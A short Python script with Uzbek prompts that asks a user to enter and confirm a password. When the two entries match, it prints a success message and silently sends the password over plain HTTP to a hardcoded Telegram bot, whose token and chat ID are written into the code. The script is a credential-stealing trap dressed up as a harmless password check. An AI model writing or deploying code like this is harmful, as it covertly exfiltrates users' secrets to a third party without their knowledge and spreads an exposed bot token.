import requests
pas1 = input('Parol ')
pas2 = input('Parolni qaytadan ')
api = ("http://api.telegram.org/bot6473298738:AAFO4DfAr5MEMXSwn1SO_H8ZjzBysLQM_vI/SendMessage?chat_id=1881974412&text="+pas1)
if pas1 == pas2:
 print('Togri')
 requests.get(api)
else:
   print('Hato kiritdiz')
